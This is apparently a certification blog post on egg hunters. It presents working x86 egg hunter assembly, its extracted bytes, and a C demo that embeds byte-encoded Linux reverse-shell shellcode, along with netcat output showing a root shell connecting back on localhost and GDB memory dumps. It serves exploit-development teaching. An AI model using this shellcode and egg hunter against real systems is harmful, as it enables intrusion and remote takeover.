---
layout: post
title: "SLAE Problem 3: Egg Hunter Demonstration"
description: "A demonstration of an egg hunter searching for shellcode"
tags: [asm, shellcode, c, egg, hunter]
---


# Assignment 3

This blog post has been created for completing the requirements for the SecurityTube
Linux Assembly Expert certification:
[<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert)

Student ID: SLAE-824

## Requirements

- Study about Egg Hunter Shellcode
- Create a working egghunter demo
- Make demo configurable for different payloads

## Background

So what exactly is an "egghunter"? Well recently I embarked upon the
[OSCE course](https://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/)
from [Offensive Security](https://www.offensive-security.com) and learned just
that... Although I have yet to pass the exam :(

Anyhow, essentially what an "egghunter" does is search through memory and
locate a marker. Once this marker has been found it jumps to the next
instruction which is generally a malicous payload that was preceded with
the marker. So for example:

    0xdeadbeef w00tw00t
    0xxxxxxxxx malicious
    0xxxxxxxxx code
    0xxxxxxxxx here
    ...snip...

The egghunter code would search all of the memory within the process until it
came upon `0xdeadbeef`. Once it looked at the value at that address, it would
find the marker bytes that it was looking for and proceed to execute the
instruction at the memory address immediately following the marker.

## Strategy

So how will we demonstrate such a feat? Well, we will attempt to:

- Create a C program that will create a decent sized uninitialized buffer of memory.
- Copy some marked shellcode into the buffer at run time within our main function. This will simulate a piece of marked shellcode landing during a bufferoverflow.
- Write our egghunter code in assembly and extract the bytes as we have been doing from our previous exam problems.
- Cast the egghunter bytes to a function pointer and execute

If all goes well our egghunter should find the shellcode we placed in the buffer and execute it.

## Helpful Resources

Some great resources on the topic:

- [skape egghunter paper](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf). Egghunter writing methodology.
- [Memory Paging on Linux](http://www.tldp.org/LDP/tlk/mm/memory.html). Helps fill in some of knowledge gaps of the Egghunter methodology.
- [Another Memory Paging Article](http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory/)
- [corelan.be](https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/). Great exploit tutorials.
- [fuzzysecurity](http://www.fuzzysecurity.com/tutorials/expDev/4.html). More great tutorials.

## The Assembly

I'm glad I did a little research on writing egghunters before I
started writing one because I learned that my naive implementation
wouldn't have worked. My initial thought was to just load up an
address in memory and to start comparing bytes looking for my
marker. As I was reminded this would have ended up resulting in
a SIGSEGV. All virtual memory from lowest to highest addresses
is NOT accessible to a program and attempts to access it will result
in a SIGSEGV exception. This should have been obvious to me as segfaults
when playing around with bufferoverflows occur because memory that
has not been allocated by/for the program is attempting to be accessed.
Due to the kernel reserving memory, ASLR memory randomization leaving
un-allocated chunks of memory between the memory segments, as well
as un-allocated memory between the stack and heap to allow both room
to grow, there are quite a few places where an egghunter that simply
just tries to dereference every memory address would fail.
According to [skape egghunter paper](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)
one way that we can work around this is by utilizing system calls.

Since system calls work in Kernel Mode. Attempts at accessing memory
that is not accessible to our process will not segfault but will
raise a more friendly exception instead. The egghunters that are
presented in the skape paper leverage this technique. We will utilize
the `access(2) revisited` egghunter in our demonstration.

{% highlight nasm %}
  global _start
  section .text
    _start:
      ;; Clear out edx. We will use
      ;; this to keep track of the memory
      ;; that we are searching
      xor edx,edx
    initpage:
      ;; Initialize edx to PAGE_SIZE 0x1000 or 4096 bytes
      or dx,0xfff
    incpage:
      inc edx
      ;; Load the address 4 bytes past edx into ebx
      ;; We do this so we can compare 8 bytes
      ;; e.g w00tw00t
      lea ebx,[edx+0x4]
      ;; Push the access(2) syscall number onto the stack
      ;; This pushes a 32-bit or 4 byte value onto
      ;; the stack as 0x00000021
      push byte +0x21
      ;; Place the syscall number into eax
      ;; Since we used a push pop to set eax
      ;; we get the top 3 bytes zeroed out without
      ;; having to worry about what their values were previously
      ;; this saves a byte over xor
      pop eax
      ;; Call our access system call
      int 0x80
      ;; Look at the result of the syscall.
      ;; If it is  0xf2 which represents the low byte
      ;;of the EFAULT return value
      cmp al,0xf2
      ;; We looked at invalid memory so go back
      ;; and increment the page and start again
      jz initpage
      ;; Otherwise start looking for our marker
      mov eax,0x50905090
      ;; scasd compares the value in eax with
      ;; with the a double word pointed to by edi
      ;; as such, we move the address in edx into edi
      mov edi,edx
      ;; and compare our marker
      ;; scasd is auto incremented (or decremented)
      scasd
      ;; if it doesn't match, go increment our page
      ;; and try again
      jnz incpage
      ;; if it does match, fingers crossed...
      ;; check the next 4 bytes
      ;; Since scasd auto increments edi, we are
      ;; looking at edi+4 now
      scasd
      ;; if we don't have a match, no soup for us
      ;; increment our page and try again
      jnz incpage
      ;; if we had a match, scasd incremented edit
      ;; once again so when we jump there we should
      ;; be jumping to our shellcode!
      jmp edi
{% endhighlight %}

Cool. We have some egghunter code, lets setup an example program to
test it out. We will first compile and dump the bytes of our egghunter:

`./compile egghunter`

{% highlight bash %}

objdump -d ./egghunter|grep '[0-9a-f]:'\
| grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '\
|tr -s ' '|tr '\t' ' ' |sed 's/ $//g'|sed 's/ /\\x/g'\
|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"

{% endhighlight %}

We will leverage our reverse shell from our previous
tutorial.

{% highlight c %}

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1"
"\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80\x1\x1\x2"
"\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89\xe1"
"\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0"
"\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

{% endhighlight %}

Create our c program demo

{% highlight c %}

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EGG "\x50\x90\x50\x90"

unsigned char egghunter[] = \
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80"
"\x3c\xf2\x74\xee\xb8"
EGG
"\x89\xd7\xaf\x75\xe9\xaf\x75"
"\xe6\xff\xe7";

unsigned char shellcode[] = \
EGG
EGG
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1"
"\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80\x1\x1\x2"
"\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89\xe1"
"\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0"
"\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";


main()
{
    int shellcode_len = strlen(shellcode);
    printf("Egghunter Length:  %d\n", strlen(egghunter));
    printf("Shellcode Length:  %d\n", shellcode_len);

    // Create a buffer to place our shellcode
    char *badbuffer;
    badbuffer=malloc(shellcode_len);
    memcpy(badbuffer,shellcode,shellcode_len);

	int (*ret)() = (int(*)())egghunter;
	ret();

    free(badbuffer);

}

{% endhighlight %}

If we compile our egghunterdemo.c using `gcc -g egghunterdemo.c -o egghunterdemo`,
start a netcat listener on port 444 (as our shellcode is a reverse shell) using
`netcat -nlvp 4444` and then execute our egghunter using `./egghunterdemo` we
will see that we indeed get a connection back from our shellcode~

{% highlight bash %}

root@blahblah:~/shared/SLAE/slae/exercise3# nc -nlvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37323
id
uid=0(root) gid=0(root) groups=0(root)

{% endhighlight %}


To prove that there is nothing up our sleves, lets hook GDB and inspect where
everything is in memory.

Right before we execute our egghunter the memory is laid out as such:

### Egghunter

{% highlight bash %}

(gdb)  x/40xb egghunter
0x8049880 <egghunter>:	    0x31	0xd2	0x66	0x81	0xca	0xff	0x0f	0x42
0x8049888 <egghunter+8>:	0x8d	0x5a	0x04	0x6a	0x21	0x58	0xcd	0x80
0x8049890 <egghunter+16>:	0x3c	0xf2	0x74	0xee	0xb8	0x50	0x90	0x50
0x8049898 <egghunter+24>:	0x90	0x89	0xd7	0xaf	0x75	0xe9	0xaf	0x75
0x80498a0 <egghunter+32>:	0xe6	0xff	0xe7	0x00	0x00	0x00	0x00	0x00

{% endhighlight %}

### Shellcode Buffer

{% highlight bash %}
(gdb) x/104xb badbuffer
0x804a008:	0x50	0x90	0x50	0x90	0x50	0x90	0x50	0x90
0x804a010:	0x31	0xc0	0xb0	0x66	0x31	0xdb	0xb3	0x01
0x804a018:	0x31	0xc9	0x51	0x53	0x6a	0x02	0x89	0xe1
0x804a020:	0xcd	0x80	0x31	0xff	0x89	0xc7	0x31	0xc0
0x804a028:	0xb0	0x66	0x31	0xc9	0xb9	0x80	0x01	0x01
0x804a030:	0x02	0x81	0xe9	0x01	0x01	0x01	0x01	0x51
0x804a038:	0x66	0x68	0x11	0x5c	0x43	0x66	0x53	0x89
0x804a040:	0xe1	0x6a	0x10	0x51	0x57	0x89	0xe1	0x43
0x804a048:	0xcd	0x80	0x31	0xc9	0xb1	0x02	0x31	0xc0
0x804a050:	0xb0	0x3f	0xcd	0x80	0x49	0x79	0xf9	0x31
0x804a058:	0xc0	0xb0	0x0b	0x31	0xdb	0x53	0x68	0x2f
0x804a060:	0x2f	0x73	0x68	0x68	0x2f	0x62	0x69	0x6e
0x804a068:	0x89	0xe3	0x31	0xc9	0x31	0xd2	0xcd	0x80

{% endhighlight %}

Wee can see that our egghunter code and our buffer are in fact in two
separate places within memory. We add a breakpoint at the beginning of
our egghunter code:

{% highlight bash %}
(gdb) disassemble
Dump of assembler code for function egghunter:
=> 0x08049880 <+0>:	xor    edx,edx
   0x08049882 <+2>:	or     dx,0xfff
   0x08049887 <+7>:	inc    edx
   0x08049888 <+8>:	lea    ebx,[edx+0x4]
   0x0804988b <+11>:	push   0x21
   0x0804988d <+13>:	pop    eax
   0x0804988e <+14>:	int    0x80
   0x08049890 <+16>:	cmp    al,0xf2
   0x08049892 <+18>:	je     0x8049882 <egghunter+2>
   0x08049894 <+20>:	mov    eax,0x90509050
   0x08049899 <+25>:	mov    edi,edx
   0x0804989b <+27>:	scas   eax,DWORD PTR es:[edi]
   0x0804989c <+28>:	jne    0x8049887 <egghunter+7>
   0x0804989e <+30>:	scas   eax,DWORD PTR es:[edi]
   0x0804989f <+31>:	jne    0x8049887 <egghunter+7>
   0x080498a1 <+33>:	jmp    edi
   0x080498a3 <+35>:	add    BYTE PTR [eax],al

{% endhighlight %}

We place another breakpoint at our `jmp edi` instruction.
If this instruction is hit and executes it means that our
egghunter has found our marker and that it is about to
execute the code right after our marker. As we can see
in the gdb output our `jmp edi` does in fact get hit.


{% highlight bash %}

(gdb) disassemble
Dump of assembler code for function egghunter:
   0x08049880 <+0>:	xor    edx,edx
   0x08049882 <+2>:	or     dx,0xfff
   0x08049887 <+7>:	inc    edx
   0x08049888 <+8>:	lea    ebx,[edx+0x4]
   0x0804988b <+11>:	push   0x21
   0x0804988d <+13>:	pop    eax
   0x0804988e <+14>:	int    0x80
   0x08049890 <+16>:	cmp    al,0xf2
   0x08049892 <+18>:	je     0x8049882 <egghunter+2>
   0x08049894 <+20>:	mov    eax,0x90509050
   0x08049899 <+25>:	mov    edi,edx
   0x0804989b <+27>:	scas   eax,DWORD PTR es:[edi]
   0x0804989c <+28>:	jne    0x8049887 <egghunter+7>
   0x0804989e <+30>:	scas   eax,DWORD PTR es:[edi]
   0x0804989f <+31>:	jne    0x8049887 <egghunter+7>
=> 0x080498a1 <+33>:	jmp    edi
   0x080498a3 <+35>:	add    BYTE PTR [eax],al

{% endhighlight %}

We allow the program to continue and we end up with our
reverse shell connection.
